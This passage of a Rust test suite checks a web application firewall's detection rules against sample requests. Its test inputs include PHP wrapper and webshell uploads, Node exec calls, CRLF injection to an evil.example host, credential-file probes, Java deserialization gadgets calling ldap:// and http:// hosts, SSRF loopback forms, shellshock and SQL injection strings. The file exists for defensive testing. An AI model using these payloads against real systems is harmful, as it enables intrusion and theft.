        assert_detected(&level_one, "FE-PHP-001-Q", Surface::Query(query)).await;
    }
    assert_clean(
        &level_one,
        "FE-PHP-001-Q",
        Surface::Query("x=system%20design"),
    )
    .await;
    assert_clean(
        &level_one,
        "FE-PHP-001-Q",
        Surface::Query("x=%3C?xml%20version=%221.0%22?%3E"),
    )
    .await;

    for query in [
        "page=php://input",
        "page=phar://uploads/avatar.jpg",
        "page=zip://shell.zip%23x.php",
        "page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B",
    ] {
        assert_detected(&level_one, "FE-PHP-002-Q", Surface::Query(query)).await;
    }
    assert_clean(&level_one, "FE-PHP-002-Q", Surface::Query("zip=90210")).await;

    for query in [
        "x=require('child_process').exec('id')",
        "x=process.mainModule.require('fs')",
        "x=this.constructor.constructor('return%20process')()",
    ] {
        assert_detected(&level_one, "FE-NODE-001-Q", Surface::Query(query)).await;
    }
    assert_clean(
        &level_one,
        "FE-NODE-001-Q",
        Surface::Query("x=require('lodash')&y=process.env"),
    )
    .await;

    // Code-hosting and notebook APIs carry source, so body mirrors are L2.
    // PHP reads its own request body through `php://input`.
    let php_source: &[u8] = br#"{"source":"<?php echo 'hi'; ?>"}"#;
    let node_source: &[u8] = br#"{"source":"const cp = require('child_process');"}"#;
    let php_wrapper_source: &[u8] =
        br#"{"source":"$raw = file_get_contents('php://input'); $t = fopen('php://temp', 'r+');"}"#;
    let phar_value: &[u8] = br#"{"template":"phar://uploads/x.jpg/y"}"#;
    assert_clean(&level_one, "FE-PHP-001-B", Surface::Body(JSON, php_source)).await;
    for body in [php_wrapper_source, phar_value] {
        assert_clean(&level_one, "FE-PHP-002-B", Surface::Body(JSON, body)).await;
    }
    assert_clean(
        &level_one,
        "FE-NODE-001-B",
        Surface::Body(JSON, node_source),
    )
    .await;
    let level_two = monitor_waf(2);
    assert_detected(&level_two, "FE-PHP-001-B", Surface::Body(JSON, php_source)).await;
    for body in [php_wrapper_source, phar_value] {
        assert_detected(&level_two, "FE-PHP-002-B", Surface::Body(JSON, body)).await;
    }
    assert_detected(
        &level_two,
        "FE-NODE-001-B",
        Surface::Body(JSON, node_source),
    )
    .await;
}

#[tokio::test]
async fn crlf_header_injection_through_query_values_is_detected() {
    let plugin = monitor_waf(1);
    for query in [
        "next=/home%0D%0ASet-Cookie:%20session=attacker",
        "next=/home%0ALocation:%20https://evil.example/",
        "next=x%0D%0A%0D%0AHTTP/1.1%20200%20OK",
        // A double-encoded CRLF is reduced by the layered query decode.
        "next=/home%250D%250ASet-Cookie:%20a=b",
    ] {
        assert_detected(&plugin, "FE-CRLF-001", Surface::Query(query)).await;
    }
    assert_clean(
        &plugin,
        "FE-CRLF-001",
        Surface::Query("note=line%20one%0Aline%20two"),
    )
    .await;
}

#[tokio::test]
async fn restricted_file_probes_are_detected_on_the_canonical_path() {
    let plugin = monitor_waf(1);
    for path in [
        "/.git/config",
        "/.git",
        "/app/.env",
        "/.env.production",
        "/.htaccess",
        "/.aws/credentials",
        "/home/deploy/.ssh/id_rsa",
        "/.npmrc",
        "/web.config",
        "/wp-config.php.bak",
        "/wp-config.php~",
        "/.wp-config.php.swp",
        "/.DS_Store",
        "/.svn/entries",
    ] {
        assert_detected(&plugin, "FE-RESTRICTED-001", Surface::Path(path)).await;
    }
    for path in [
        "/.well-known/acme-challenge/token",
        "/.github/workflows/ci.yml",
        "/.gitignore",
        "/api/env",
        "/docs/git/config",
        "/.envelope",
        "/wp-config-sample.php",
    ] {
        assert_clean(&plugin, "FE-RESTRICTED-001", Surface::Path(path)).await;
    }

    // The WAF reads the canonical policy path, which has already decoded an
    // encoded `.`; the literal `/.git/config` spelling is not required.
    let encoded = canonicalize_policy_path("/%2egit/config").unwrap();
    assert_eq!(encoded, "/.git/config");
    assert_detected(&plugin, "FE-RESTRICTED-001", Surface::Path(&encoded)).await;
    let benign = canonicalize_policy_path("/docs/%2egithub/README").unwrap();
    assert_clean(&plugin, "FE-RESTRICTED-001", Surface::Path(&benign)).await;

    // Backup/dump artifacts are legitimate downloads on some sites: L2.
    assert_clean(
        &plugin,
        "FE-RESTRICTED-002",
        Surface::Path("/index.php.bak"),
    )
    .await;
    let level_two = monitor_waf(2);
    for path in ["/index.php.bak", "/db.sql", "/index.php~", "/data.sqlite3"] {
        assert_detected(&level_two, "FE-RESTRICTED-002", Surface::Path(path)).await;
    }
    assert_clean(
        &level_two,
        "FE-RESTRICTED-002",
        Surface::Path("/~user/home"),
    )
    .await;
}

#[tokio::test]
async fn executable_upload_filename_requires_multipart_inspection() {
    let body: &[u8] = b"--b\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET['c']); ?>\r\n--b--\r\n";
    let multipart = "multipart/form-data; boundary=b";

    // Multipart bodies are outside the default scan scope.
    assert_clean(
        &monitor_waf(1),
        "FE-UPLOAD-001",
        Surface::Body(multipart, body),
    )
    .await;

    let inspecting = Waf::new(&json!({
        "mode": "monitor",
        "inspect_multipart": true,
        "scan_budget_ms": 0
    }))
    .unwrap();
    assert_detected(&inspecting, "FE-UPLOAD-001", Surface::Body(multipart, body)).await;
    for filename in [
        "filename=\"x.PhP5\"",
        "filename=shell.jsp",
        "filename*=UTF-8''shell.aspx",
        "filename=\".htaccess\"",
        // Windows/IIS strip trailing dots and spaces and read `::$DATA` as the
        // default stream; a NUL truncates the name in C-backed handlers.
        "filename=\"shell.php.\"",
        "filename=\"shell.php \"",
        "filename=\"shell.php::$DATA\"",
        "filename=\"shell.php%00.jpg\"",
        "filename=\"shell.php\0.jpg\"",
    ] {
        let part = format!(
            "--b\r\nContent-Disposition: form-data; name=\"f\"; {filename}\r\n\r\nx\r\n--b--\r\n"
        );
        assert_detected(
            &inspecting,
            "FE-UPLOAD-001",
            Surface::Body(multipart, part.as_bytes()),
        )
        .await;
    }
    for filename in [
        "filename=\"report.pdf\"",
        "filename=\"notes.phpinfo.txt\"",
        "filename=\"a.aspirin.png\"",
    ] {
        let part = format!(
            "--b\r\nContent-Disposition: form-data; name=\"f\"; {filename}\r\n\r\nx\r\n--b--\r\n"
        );
        assert_clean(
            &inspecting,
            "FE-UPLOAD-001",
            Surface::Body(multipart, part.as_bytes()),
        )
        .await;
    }

    // A form or JSON field that names a script is not an upload: only a
    // multipart `Content-Disposition` parameter is.
    assert_clean(
        &inspecting,
        "FE-UPLOAD-001",
        Surface::Body(FORM, b"title=home&filename=index.php"),
    )
    .await;
    assert_clean(
        &inspecting,
        "FE-UPLOAD-001",
        Surface::Body(
            JSON,
            br#"{"filename":"index.php","path":"/var/www/shell.php"}"#,
        ),
    )
    .await;
}

/// An RFC 8187 `filename*` value may name any charset and a language tag, and
/// percent-encode the name.
#[tokio::test]
async fn upload_filename_star_accepts_any_charset_and_language_tag() {
    let inspecting = Waf::new(&json!({
        "mode": "monitor",
        "inspect_multipart": true,
        "scan_budget_ms": 0
    }))
    .unwrap();
    let multipart = "multipart/form-data; boundary=b";
    let long_charset = format!("filename*={}''shell.php", "x".repeat(60));
    let long_tag = format!("filename*=UTF-8'{}'shell.php", "a".repeat(50));
    for filename in [
        "filename*=UTF-8'en'shell.php",
        "filename*=ISO-8859-1''shell.php",
        "filename*=utf-8''shell%2Ephp",
        "filename*=ISO-8859-1'de'shell.p%68p",
        "filename*=UTF-8'en-us'shell%2Ephp%2Ejpg",
        // Lenient parsers split the prefix on `'` without checking it, so an
        // underscore tag, an unusual charset, and a padded prefix all count.
        "filename*=UTF-8'en_US'shell.php",
        "filename*=UTF.8''shell.php",
        long_charset.as_str(),
        long_tag.as_str(),
    ] {
        let part = format!(
            "--b\r\nContent-Disposition: form-data; name=\"f\"; {filename}\r\n\r\nx\r\n--b--\r\n"
        );
        assert_detected(
            &inspecting,
            "FE-UPLOAD-001",
            Surface::Body(multipart, part.as_bytes()),
        )
        .await;
    }
    for filename in [
        "filename*=UTF-8'en'report.pdf",
        "filename*=ISO-8859-1''notes%2Etxt",
        "filename*=UTF-8'en'php-guide.pdf",
    ] {
        let part = format!(
            "--b\r\nContent-Disposition: form-data; name=\"f\"; {filename}\r\n\r\nx\r\n--b--\r\n"
        );
        assert_clean(
            &inspecting,
            "FE-UPLOAD-001",
            Surface::Body(multipart, part.as_bytes()),
        )
        .await;
    }
}

#[tokio::test]
async fn deserialization_gadgets_are_detected_without_flagging_json_ld() {
    let plugin = monitor_waf(1);
    assert_detected(
        &plugin,
        "FE-DESER-001",
        Surface::Body(TEXT, b"payload=aced0005737200116a617661"),
    )
    .await;
    // Hex ids that merely contain the magic, or carry no stream after it.
    for body in [
        br#"{"commit":"9aced0005c0ffee12"}"#.as_slice(),
        br#"{"color":"aced0005"}"#,
    ] {
        assert_clean(&plugin, "FE-DESER-001", Surface::Body(JSON, body)).await;
    }
    for body in [
        b"!!python/object/apply:os.system ['id']".as_slice(),
        b"x: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[]]]",
        b"--- !ruby/object:Gem::Installer\ni: x",
    ] {
        assert_detected(&plugin, "FE-DESER-004", Surface::Body(TEXT, body)).await;
    }
    for body in [
        br#"{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x/a","autoCommit":true}"#.as_slice(),
        br#"{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}"#,
        br#"{"@class":"org.springframework.context.support.FileSystemXmlApplicationContext"}"#,
        // Fastjson autoType bypasses: JVM descriptor and array spellings.
        br#"{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://x/a"}"#,
        br#"{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://x/a"}"#,
        br#"{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://x/a"}]}"#,
        // Jackson `WRAPPER_ARRAY` default typing carries no discriminator key.
        br#"["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://x/a"}]"#,
    ] {
        assert_detected(&plugin, "FE-DESER-005", Surface::Body(JSON, body)).await;
    }
    for body in [
        br#"{"@context":"https://schema.org","@type":"Product","name":"Widget"}"#.as_slice(),
        br#"{"$type":"MyApp.Models.Order, MyApp"}"#,
        br#"{"@class":"com.example.Invoice"}"#,
        br#"{"@type":"Lunch"}"#,
        br#"["com.example.Order",{"id":1}]"#,
        br#"{"deps":[["org.apache.commons:commons-lang3",{"scope":"test"}]]}"#,
    ] {
        assert_clean(&plugin, "FE-DESER-005", Surface::Body(JSON, body)).await;
    }
    assert_clean(
        &plugin,
        "FE-DESER-004",
        Surface::Body(TEXT, b"key: !!str value\nblob: !!binary aGk="),
    )
    .await;
}

/// Spring is matched by its gadget packages, so Spring Session / Spring
/// Security JSON — discriminated or `WRAPPER_ARRAY` typed — is not a gadget.
#[tokio::test]
async fn spring_session_json_is_not_a_polymorphic_gadget() {
    let plugin = monitor_waf(1);
    for body in [
        br#"{"@class":"org.springframework.beans.factory.config.PropertyPathFactoryBean","targetBeanName":"ldap://x/a","propertyPath":"x"}"#.as_slice(),
        br#"["org.springframework.beans.factory.config.PropertyPathFactoryBean",{"targetBeanName":"ldap://x/a"}]"#,
        br#"["org.springframework.transaction.jta.JtaTransactionManager",{"userTransactionName":"ldap://x/a"}]"#,
    ] {
        assert_detected(&plugin, "FE-DESER-005", Surface::Body(JSON, body)).await;
    }

    // A Spring Session security context as its Jackson serializer writes it:
    // discriminated Spring Security types, `java.util` collection wrappers,
    // and a `java.lang.Long` scalar wrapper.
    let spring_session = concat!(
        r#"{"@class":"org.springframework.security.core.context.SecurityContextImpl","#,
        r#""authentication":{"@class":"#,
        r#""org.springframework.security.authentication.UsernamePasswordAuthenticationToken","#,
        r#""authorities":["java.util.Collections$UnmodifiableRandomAccessList",[{"#,
        r#""@class":"org.springframework.security.core.authority.SimpleGrantedAuthority","#,
        r#""authority":"ROLE_USER"}]],"details":{"#,
        r#""@class":"org.springframework.security.web.authentication.WebAuthenticationDetails","#,
        r#""remoteAddress":"203.0.113.10","sessionId":null},"authenticated":true,"#,
        r#""principal":{"@class":"org.springframework.security.core.userdetails.User","#,
        r#""username":"alice","enabled":true},"credentials":null},"#,
        r#""creationTime":["java.lang.Long",1700000000000]}"#,
    );
    assert_clean(
        &plugin,
        "FE-DESER-005",
        Surface::Body(JSON, spring_session.as_bytes()),
    )
    .await;
    for body in [
        br#"["org.springframework.security.core.authority.SimpleGrantedAuthority",{"authority":"ROLE_USER"}]"#.as_slice(),
        br#"{"@class":"org.springframework.session.MapSession","id":"5f1c","maxInactiveInterval":1800}"#,
    ] {
        assert_clean(&plugin, "FE-DESER-005", Surface::Body(JSON, body)).await;
    }
}

/// Jackson's `WRAPPER_ARRAY` also types a gadget built from one string
/// (CVE-2017-17485: `["…FileSystemXmlApplicationContext","http://…"]`), and
/// `org.springframework.web.context.support.` holds the web-context variants.
/// A pair of package names, a longer class list, a Maven coordinate, a JDK
/// value type, and Spring Security's own types stay clean.
#[tokio::test]
async fn spring_gadget_array_with_a_string_argument_is_detected() {
    let plugin = monitor_waf(1);
    for body in [
        br#"["org.springframework.context.support.FileSystemXmlApplicationContext","http://x/spel.xml"]"#.as_slice(),
        br#"{"a":["org.springframework.context.support.ClassPathXmlApplicationContext", "http://x/spel.xml"]}"#,
        br#"["org.springframework.web.context.support.XmlWebApplicationContext",{"configLocation":"http://x/spel.xml"}]"#,
        br#"["org.springframework.web.context.support.GroovyWebApplicationContext","http://x/a.groovy"]"#,
    ] {
        assert_detected(&plugin, "FE-DESER-005", Surface::Body(JSON, body)).await;
    }
    for body in [
        br#"["org.springframework.security.core.authority.SimpleGrantedAuthority","ROLE_USER"]"#.as_slice(),
        br#"["org.springframework.session.MapSession","5f1c"]"#,
        br#"["org.springframework.web.servlet.DispatcherServlet","x"]"#,
        br#"{"packages":["org.apache.commons","org.apache.http"]}"#,
        br#"{"classes":["org.apache.Foo","org.apache.Bar","org.apache.Baz"]}"#,
        br#"{"deps":["org.apache.commons:commons-lang3","3.12.0"]}"#,
        br#"{"homepage":["java.net.URL","https://example.com/a"]}"#,
    ] {
        assert_clean(&plugin, "FE-DESER-005", Surface::Body(JSON, body)).await;
    }
}

#[tokio::test]
async fn ssrf_covers_additional_metadata_endpoints_and_alternate_loopback_forms() {
    let level_one = monitor_waf(1);
    for query in [
        "u=http://169.254.170.2/v2/credentials",
        "u=http://%5Bfd00:ec2::254%5D/latest/meta-data/",
        "u=http://100.100.100.200/latest/meta-data/",
    ] {
        assert_detected(&level_one, "FE-SSRF-001-Q", Surface::Query(query)).await;
    }

    // `localhost` and alternate numeric spellings are L2.
    let loopback_forms = [
        "u=http://localhost/admin",
        "u=http://0/",
        "u=http://0.0.0.0:8080/",
        "u=http://2130706433/",
        "u=http://0x7f000001/",
        "u=http://017700000001/",
        "u=http://0x7f.1/",
        "u=http://%5B::1%5D/",
        "u=http://%5B::ffff:127.0.0.1%5D/",
        "u=gopher://localhost:6379/_INFO",
        "u=http://127.1/",
        "u=http://127.0.1:8080/",
        "u=http://localhost./admin",
    ];
    for query in loopback_forms {
        assert_clean(&level_one, "FE-SSRF-003-Q", Surface::Query(query)).await;
    }
    let level_two = monitor_waf(2);
    for query in loopback_forms {
        assert_detected(&level_two, "FE-SSRF-003-Q", Surface::Query(query)).await;
    }
    for query in [
        "u=http://localhost.example.com/",
        "u=https://example.com/",
        "u=http://123.45.67.89/",
        "u=http://0day.example/",
        "u=http://127.1.example.com/",
    ] {
        assert_clean(&level_two, "FE-SSRF-003-Q", Surface::Query(query)).await;
    }
    assert_detected(
        &level_two,
        "FE-SSRF-003-B",
        Surface::Body(JSON, br#"{"webhook":"http://[::1]:9000/hook"}"#),
    )
    .await;
}

/// The recommended starting posture enforces the new level-1 signatures
/// through bulk `default_rule_action: enforce`, and keeps level-2 mirrors out.
#[tokio::test]
async fn recommended_posture_enforces_new_level_one_signatures() {
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "default_rule_action": "enforce",
        "paranoia_level": 1,
        "scan_budget_ms": 0
    }))
    .unwrap();

    for surface in [
        Surface::Query("id=1%20AND%20SLEEP(5)"),
        Surface::Query("host=$(whoami)"),
        Surface::Cookie("id=1 UNION SELECT password FROM users"),
        Surface::Header("user-agent", "() { :; }; /bin/id"),
        Surface::Path("/.git/config"),
        Surface::Body(JSON, br#"{"@type":"com.sun.rowset.JdbcRowSetImpl"}"#),
    ] {
        let (result, request) = scan(&plugin, &surface).await;
        assert!(
            matches!(
                result,
                PluginResult::Reject {
                    status_code: 403,
                    ..
                }
            ),
            "{} must be rejected at the recommended posture; hits={:?}",
            describe(&surface),
            hits(&request)
        );
    }

    for surface in [
        Surface::Query("q=shoes%20and%20socks&page=2"),
        Surface::Cookie("_ga=GA1.2.1234567890.1700000000; locale=en-US"),
        Surface::Path("/.well-known/openid-configuration"),
        Surface::Body(
            JSON,
            br#"{"@context":"https://schema.org","@type":"Product","code":"time.sleep(1)","html":"<svg></svg>"}"#,
        ),
        // Code-carrying bodies (LLM prompts, gists, CI APIs) at level 1.
        Surface::Body(
            JSON,
            br#"{"src":"def load_file(path):\n    raw = file_get_contents('php://input')\n    x = sleep(5)\n    benchmark(1000, fn)\n    foo();\n    sleep(1);"}"#,
        ),
    ] {
        let (result, request) = scan(&plugin, &surface).await;
        assert!(
            matches!(result, PluginResult::Continue),
            "{} must pass at the recommended posture; hits={:?}",
            describe(&surface),
            hits(&request)
        );
    }
}
